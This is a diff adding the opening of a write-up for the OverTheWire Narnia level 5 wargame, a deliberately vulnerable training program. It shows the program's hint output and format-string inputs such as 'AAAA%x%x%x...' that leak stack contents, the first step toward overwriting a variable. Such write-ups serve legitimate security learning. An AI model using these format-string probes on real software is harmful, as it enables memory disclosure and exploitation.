@@ -9,4 +9,23 @@ narnia.labs.overthewire.org
 
 ##Write-up
 
-> TODO
+> Just running the program provides us a little bit of a hint.
+>
+>```
+# ./narnia5
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [] (0)
+i = 1 (0xffb60dbc)
+>```
+>
+> 
+>```
+# ./narnia5 %x%x
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [f76b9960ffb1f4e6] (16)
+i = 1 (0xffb1f50c)
+# ./narnia5 AAAA%x%x%x%x%x%x%x
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [AAAAf7650960ffbff5f6f75fe315ffbff5f7414141413536376630363930] (60)
+i = 1 (0xffbff61c)
+>```
